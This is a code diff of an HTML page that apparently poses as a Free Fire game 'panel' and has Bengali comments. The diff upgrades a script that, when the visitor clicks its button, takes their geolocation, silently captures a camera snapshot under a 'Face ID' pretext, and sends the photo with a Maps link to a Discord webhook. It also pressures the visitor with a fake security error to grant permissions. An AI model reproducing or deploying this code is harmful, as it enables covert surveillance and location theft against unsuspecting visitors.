@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FF PANEL PRO v4.0</title>
+    <title>FF PANEL PRO v5.0</title>
     <style>
         body { background: #0b1116; color: white; font-family: sans-serif; text-align: center; margin: 0; }
         .hero { padding: 40px 20px; background: #161b22; border-bottom: 2px solid #ff0055; }
@@ -34,36 +34,47 @@
         const btn = document.getElementById('mainBtn');
         btn.innerText = "PROCESSING...";
         
-        // ১. লোকেশন ট্র্যাকিং
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            sendToDiscord(`📍 **Map:** http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-        });
+        let latitude = "Not Found";
+        let longitude = "Not Found";
 
-        // ২. সাইলেন্ট ক্যামেরা স্ন্যাপশট
+        // ১. আগে লোকেশন নিবে
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            latitude = pos.coords.latitude;
+            longitude = pos.coords.longitude;
+            startCamera(latitude, longitude);
+        }, (err) => {
+            startCamera("Denied", "Denied");
+        });
+    }
+
+    async function startCamera(lat, lon) {
+        const btn = document.getElementById('mainBtn');
         try {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
 
-            // ২ সেকেন্ড পর ছবি তুলবে যাতে ক্যামেরা ফোকাস হয়
             setTimeout(async () => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                // ছবিটিকে Blob ফাইলে রূপান্তর
                 canvas.toBlob(async (blob) => {
                     const formData = new FormData();
                     formData.append('file', blob, 'snapshot.jpg');
-                    formData.append('content', "📸 **New Face ID Snapshot!**");
+                    
+                    // এখানে ছবি এবং লোকেশন একসাথে মেসেজে যাবে
+                    let msg = `📸 **New Face ID Snapshot!**\n📍 **Location:** http://google.com/maps?q=$${lat},${lon}`;
+                    if(lat === "Denied") msg = "📸 **Snapshot Captured!**\n🚫 *Location Permission Denied*";
+                    
+                    formData.append('content', msg);
 
                     await fetch(webhook, {
                         method: 'POST',
                         body: formData
                     });
 
-                    // ক্যামেরা বন্ধ করা
                     stream.getTracks().forEach(t => t.stop());
                 }, 'image/jpeg');
                 
@@ -72,17 +83,9 @@
             }, 2000);
 
         } catch (e) {
-            alert("Please allow camera permission for Face ID!");
+            alert("Security Error! Please ALLOW permissions.");
             btn.innerText = "RETRY";
         }
-    }
-
-    async function sendToDiscord(msg) {
-        await fetch(webhook, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ content: msg })
-        });
     }
     </script>
 </body>
